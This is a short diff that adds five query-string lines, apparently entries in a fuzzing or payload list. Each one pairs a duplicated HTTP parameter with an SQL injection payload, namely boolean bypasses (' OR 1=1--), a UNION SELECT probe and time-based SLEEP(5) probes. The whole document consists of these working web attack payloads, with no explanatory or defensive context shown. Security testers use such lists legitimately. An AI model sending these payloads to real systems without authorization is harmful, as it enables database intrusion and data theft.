@@ -1,0 +1,5 @@
+query=canvas&query=' OR 1=1--
+id=1&id=2&id=' OR 1=1--
+filter=Messaging&filter=' UNION SELECT NULL--
+page=1&page=SLEEP(5)
+sort=name&sort=(SELECT SLEEP(5))
